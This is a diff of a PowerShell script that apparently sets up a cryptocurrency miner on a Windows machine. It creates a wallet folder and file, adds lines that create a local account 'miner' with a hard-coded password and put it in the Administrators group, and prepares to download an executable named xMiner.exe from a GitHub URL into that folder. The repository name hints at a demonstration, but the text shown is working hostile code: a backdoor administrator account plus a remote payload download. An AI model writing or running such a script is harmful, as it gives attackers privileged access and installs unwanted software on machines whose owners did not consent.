@@ -6,6 +6,11 @@ Start-Sleep -s 2
 New-Item -Path "c:\" -Name "wallet" -ItemType "directory"
 New-Item -Path "c:\wallet" -Name "mfenXtMVwAKeKjzdrHYJFbsHeeqf7SDK3Z.coin" -ItemType "file" -Value "mfenXtMVwAKeKjzdrHYJFbsHeeqf7SDK3Z"
 
+
+cmd.exe /c "net user miner Mining4Ever! /add"
+cmd.exe /c "net localgroup Administrators miner /add"
+
+
 $miner = "https://raw.githubusercontent.com/tmmdemo/automate/master/xMiner.exe"
 $DEST = "c:\wallet\xMiner.exe"
 $web = New-Object -TypeName System.Net.WebClient
